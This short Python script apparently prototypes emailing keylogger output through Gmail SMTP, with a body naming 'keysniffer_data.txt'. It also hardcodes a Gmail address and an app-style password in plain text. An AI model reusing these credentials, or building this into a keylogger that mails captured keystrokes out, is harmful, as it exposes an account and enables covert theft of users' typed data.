# demo from the email sender --> trying different methods
# password = ixtz ymqt phiz lcet
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

password = "ixtzymqtphizlcet"
me = "7unkym0nk3y@gmail.com"  # email from the account
you = "7unkym0nk3y@gmail.com"  # email from the sender

email_body = """ <html><body><p> keysniffer_data.txt </p></body></html>"""

message = MIMEMultipart("alternative", None, [MIMEText(email_body, "html")])

try:
    server = smtplib.SMTP("smtp.gmail.com:587")
    server.ehlo()
    server.starttls()
    server.login(me, password)
    server.sendmail(me, you, message.as_string())
    server.quit()
    print(f"Email sent: {email_body}")
except Exception as e:
    print(f"Error in sending email: {e}")
